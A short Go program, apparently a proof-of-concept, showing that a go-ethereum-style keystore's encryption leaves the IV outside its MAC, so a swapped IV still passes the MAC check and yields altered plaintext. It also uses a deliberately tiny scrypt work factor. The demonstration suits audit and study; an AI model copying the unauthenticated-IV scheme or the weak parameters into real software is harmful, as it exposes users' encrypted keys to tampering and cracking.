package main

import (
	"bytes"
	"crypto/aes"
	"encoding/hex"
	"fmt"

	"github.com/karalabe/tinygeth/accounts/keystore"
	"github.com/karalabe/tinygeth/crypto"
	"golang.org/x/crypto/scrypt"
)

func main() {
	// Original data and password
	data := []byte("Squeamish Ossifrage")
	auth := []byte("password")

	fmt.Printf("> Encrypting: the plaintext '%s' with the password: '%s'\n", string(data), string(auth))
	// Encrypt the data using go-ethereum's keystore encryption
	// Scrypt is used for key derivation with a work factor of 2 and parallelism 1.
	cryptoStruct, _ := keystore.EncryptDataV3(data, auth, 2, 1)
	fmt.Println("> We get a cryptoStruct with the following fields:")
	fmt.Printf("\tciphertext: %s\n", cryptoStruct.CipherText)
	fmt.Printf("\tMAC: %s\n", cryptoStruct.MAC)
	fmt.Printf("\tIV: %s\n", cryptoStruct.CipherParams.IV)
	fmt.Printf("\tKDF parameters: %s\n", cryptoStruct.KDFParams)

	fmt.Println("> Attempting to decrypt the cryptoStruct with the original IV")
	ptxt, err := keystore.DecryptDataV3(cryptoStruct, string(auth))
	if err != nil {
		panic(err)
	}
	fmt.Println("\t Original plaintext:", string(ptxt))

	// Changing the IV without invalidating the MAC
	fmt.Println("> Producing a new IV that will not invalidate the MAC")
	cryptoStruct.CipherParams.IV = hex.EncodeToString(make([]byte, aes.BlockSize))
	fmt.Printf("\tnew IV: %s\n", cryptoStruct.CipherParams.IV)

	// Decoding the MAC from the crypto struct
	mac, err := hex.DecodeString(cryptoStruct.MAC)
	if err != nil {
		panic(err)
	}

	// Extracting KDF parameters
	n := cryptoStruct.KDFParams["n"].(int)
	r := cryptoStruct.KDFParams["r"].(int)
	p := cryptoStruct.KDFParams["p"].(int)
	salt, err := hex.DecodeString(cryptoStruct.KDFParams["salt"].(string))
	if err != nil {
		panic(err)
	}
	dklen := cryptoStruct.KDFParams["dklen"].(int)
	// Deriving the key
	derivedKey, err := scrypt.Key(auth, salt, n, r, p, dklen)
	if err != nil {
		panic(err)
	}

	// Decoding the ciphertext
	ctxt, err := hex.DecodeString(cryptoStruct.CipherText)
	if err != nil {
		panic(err)
	}

	// Calculating the MAC
	// Note: This still matches even after changing the IV, demonstrating the vulnerability
	calculatedMAC := crypto.Keccak256(derivedKey[16:32], ctxt)
	if !bytes.Equal(calculatedMAC, mac) {
		panic("MACs don't match")
	}

	// Attempting to decrypt the data with the modified IV
	fmt.Println("> Attempting to decrypt the cryptoStruct with the modified IV. We get a random looking plaintext")
	new_ptxt, _ := keystore.DecryptDataV3(cryptoStruct, string(auth))
	if err != nil {
		panic(err)
	}

	fmt.Println("\tNew plaintext", hex.EncodeToString(new_ptxt))
}
